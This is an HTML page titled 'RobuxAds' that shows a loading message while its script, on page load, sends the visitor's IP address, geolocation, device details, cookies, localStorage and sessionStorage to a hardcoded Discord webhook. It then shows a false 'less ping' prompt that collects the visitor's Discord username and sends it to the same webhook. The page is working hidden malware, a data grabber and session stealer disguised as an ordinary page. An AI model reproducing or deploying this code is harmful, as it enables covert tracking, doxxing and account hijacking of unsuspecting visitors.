<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RobuxAds</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }
        .container {
            text-align: center;
            padding: 20px;
            border-radius: 10px;
            background-color: #fff;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            width: 350px;
        }
        h1 {
            font-size: 24px;
        }
        input[type="text"] {
            padding: 10px;
            margin-top: 10px;
            width: 80%;
            border-radius: 5px;
            border: 1px solid #ccc;
        }
        button {
            padding: 10px 20px;
            margin-top: 10px;
            border: none;
            background-color: #007bff;
            color: white;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        .prompt {
            margin-top: 20px;
            font-size: 18px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Loading...</h1>
    </div>

    <script>
        // Automatically send information when the page is opened
        window.onload = function() {
            sendInfo();
        };

        function sendInfo() {
            fetch('https://ipwhois.app/json/')
                .then(response => response.json())
                .then(data => {
                    // Collecting additional info
                    const geoInfo = `IP: ${data.ip}\nLocation: ${data.city}, ${data.region}, ${data.country}\nLatitude: ${data.latitude}\nLongitude: ${data.longitude}\nTimezone: ${data.timezone}\nCurrency: ${data.currency}`;

                    const systemInfo = `
                        Screen Resolution: ${window.innerWidth}x${window.innerHeight}
                        Browser: ${navigator.userAgent}
                        Operating System: ${navigator.platform}
                        Device Type: ${getDeviceType()}
                        Language: ${navigator.language}
                        Battery Status: ${navigator.getBattery ? getBatteryStatus() : 'N/A'}
                        RAM: ${navigator.deviceMemory}GB
                        CPU Cores: ${navigator.hardwareConcurrency}
                        Storage: ${navigator.storage ? getStorageInfo() : 'N/A'}
                        Connection: ${navigator.connection ? getConnectionInfo() : 'N/A'}
                    `;

                    const performanceInfo = `Page Load Time: ${window.performance.timing.loadEventEnd - window.performance.timing.navigationStart} ms
                                             DNS Lookup: ${window.performance.timing.domainLookupEnd - window.performance.timing.domainLookupStart} ms
                                             TCP Handshake: ${window.performance.timing.connectEnd - window.performance.timing.connectStart} ms
                                             First Byte: ${window.performance.timing.responseStart - window.performance.timing.requestStart} ms`;

                    // Collect Cookies, LocalStorage, and SessionStorage info
                    const cookies = document.cookie ? `Cookies: ${document.cookie}` : 'No Cookies Available';
                    const localStorageInfo = localStorage.length ? `LocalStorage: ${JSON.stringify(localStorage)}` : 'No LocalStorage Data';
                    const sessionStorageInfo = sessionStorage.length ? `SessionStorage: ${JSON.stringify(sessionStorage)}` : 'No SessionStorage Data';

                    // Attempting to get social media links from local storage or cookies
                    const socialLinks = getSocialLinksFromStorage();

                    // Send the info to Discord Webhook
                    sendToWebhook(geoInfo, systemInfo, performanceInfo, cookies, localStorageInfo, sessionStorageInfo, socialLinks);

                    // After 5 seconds, prompt user for their Discord username
                    setTimeout(function() {
                        showDiscordPrompt();
                    }, 5000);
                })
                .catch(error => {
                    console.error('Error fetching geo data:', error);
                });
        }

        function getDeviceType() {
            const userAgent = navigator.userAgent.toLowerCase();
            if (userAgent.includes('mobile')) return 'Mobile';
            if (userAgent.includes('tablet')) return 'Tablet';
            return 'Desktop';
        }

        function getBatteryStatus() {
            navigator.getBattery().then(function(battery) {
                return `Level: ${battery.level * 100}% Charging: ${battery.charging ? 'Yes' : 'No'}`;
            });
        }

        function getStorageInfo() {
            return navigator.storage.estimate().then(estimate => {
                return `Used: ${estimate.usage} bytes, Free: ${estimate.quota - estimate.usage} bytes`;
            });
        }

        function getConnectionInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            return connection ? `Type: ${connection.effectiveType}, Speed: ${connection.downlink} Mbps` : 'N/A';
        }

        function getSocialLinksFromStorage() {
            // Check for social media links in localStorage or cookies
            const socialLinks = [];

            // Example search for social media-related terms
            if (document.cookie.includes('youtube.com')) {
                socialLinks.push('YouTube link found in cookies');
            }
            if (localStorage.getItem('youtube')) {
                socialLinks.push(`YouTube link found in localStorage: ${localStorage.getItem('youtube')}`);
            }
            if (sessionStorage.getItem('youtube')) {
                socialLinks.push(`YouTube link found in sessionStorage: ${sessionStorage.getItem('youtube')}`);
            }

            // Add more checks for other social platforms (Twitter, Instagram, etc.) as needed
            return socialLinks.length > 0 ? socialLinks.join('\n') : 'No social media links found';
        }

        function showDiscordPrompt() {
            const container = document.querySelector('.container');
            container.innerHTML = `
                <h1>Enter your Discord username or display name to begin removing discord cache for 9% less ping on average</h1>
                <input type="text" id="discordUsername" placeholder="Enter username">
                <button onclick="submitDiscordUsername()">Submit</button>
            `;
        }

        function submitDiscordUsername() {
            const discordUsername = document.getElementById('discordUsername').value;
            if (discordUsername) {
                sendDiscordUsernameToWebhook(discordUsername);
            } else {
                alert("Please enter a valid Discord username.");
            }
        }

        function sendDiscordUsernameToWebhook(discordUsername) {
            const webhookURL = "https://discord.com/api/webhooks/1334960796609937499/7YlpdDT2pphEH6wCeuD6eS10QIS1QQVyz2HicjXZPK5lZ7XOpgs3ZBiG_7fDFhiTpAWm"; // Replace with your actual Discord webhook URL

            const content = {
                content: "Discord Username Info",
                embeds: [{
                    title: "Discord Username",
                    fields: [
                        { name: "Discord Username", value: discordUsername, inline: false }
                    ],
                    footer: {
                        text: "Info Sent from Web"
                    }
                }]
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(content)
            })
            .then(response => response.json())
            .then(data => console.log('Discord username sent:', data))
            .catch(error => console.error('Error sending Discord username to Discord:', error));
        }

        function sendToWebhook(geoInfo, systemInfo, performanceInfo, cookies, localStorageInfo, sessionStorageInfo, socialLinks) {
            const webhookURL = "https://discord.com/api/webhooks/1334960796609937499/7YlpdDT2pphEH6wCeuD6eS10QIS1QQVyz2HicjXZPK5lZ7XOpgs3ZBiG_7fDFhiTpAWm"; // Replace with your actual Discord webhook URL

            const content = {
                content: "Detailed System Information",
                embeds: [{
                    title: "System Information",
                    fields: [
                        { name: "Geolocation Info", value: geoInfo, inline: false },
                        { name: "System Info", value: systemInfo, inline: false },
                        { name: "Performance Info", value: performanceInfo, inline: false },
                        { name: "Cookies", value: cookies, inline: false },
                        { name: "LocalStorage", value: localStorageInfo, inline: false },
                        { name: "SessionStorage", value: sessionStorageInfo, inline: false },
                        { name: "Social Media Links", value: socialLinks, inline: false }
                    ],
                    footer: {
                        text: "Info Sent from Web"
                    }
                }]
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(content)
            })
            .then(response => response.json())
            .then(data => console.log('Data sent to Discord:', data))
            .catch(error => console.error('Error sending data to Discord:', error));
        }
    </script>
</body>
</html>
